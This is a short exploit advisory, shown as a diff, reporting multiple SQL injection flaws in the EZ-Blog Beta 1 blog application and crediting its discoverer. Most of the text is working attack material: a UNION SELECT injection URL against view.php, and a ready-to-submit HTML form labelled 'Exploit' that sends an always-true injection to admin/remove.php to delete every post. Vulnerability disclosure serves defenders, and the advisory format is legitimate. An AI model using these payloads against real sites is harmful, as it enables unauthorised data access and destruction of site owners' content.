@@ -1,0 +1,43 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+
+Application:      EZ-Blog
+                         http://sourceforge.net/projects/ez-blog/
+Version:            Beta 1
+Bug:                 * Multiple SQL Injection
+Exploitation:     Remote
+Date:                1 Mar 2009
+Discovered by: Salvatore "drosophila" Fresta
+Author:             Salvatore "drosophila" Fresta
+                         e-mail: drosophilaxxx@gmail.com
+              	
+
+*************************************************
+
+- BUGS
+
+SQL Injection:
+
+	Requisites: magic_quotes_gpc = off
+
+	This is a crazy application because it not
+	require authentication for posting, deleting,
+	etc. and it is entirely vulnerable to SQL
+	Injection, as follows:
+	
+	http://site/path/public/view.php?storyid=-1' UNION ALL SELECT
+1,2,3,4,5,6,7,8,9,10%23
+	
+	There aren't hight reserved information on the
+	database, but it is possible to cause inconvenience.
+	The following injection allow to delete all
+	posts:
+	
+	<form action="http://site/path/admin/remove.php" method="POST">
+	    <input type="hidden" name="kill" value="1'or'1'='1">
+	    <input type="hidden" name="confirm" value="1">
+	    <input type="hidden" name="rm" value="true">
+	    <input type="submit" value="Exploit">
+	</form>
+
+# milw0rm.com [2009-03-02]
